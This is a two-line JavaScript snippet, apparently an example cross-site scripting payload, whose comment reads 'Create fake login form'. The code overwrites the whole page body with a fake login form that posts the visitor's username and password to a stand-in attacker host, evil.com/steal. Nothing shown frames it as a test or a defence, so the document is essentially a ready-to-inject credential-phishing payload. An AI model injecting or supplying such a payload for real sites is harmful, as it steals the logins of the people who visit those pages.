// Create fake login form
document.body.innerHTML = '<form action="https://evil.com/steal">Username: <input name="user">Password: <input name="pass" type="password"><button>Login</button></form>';
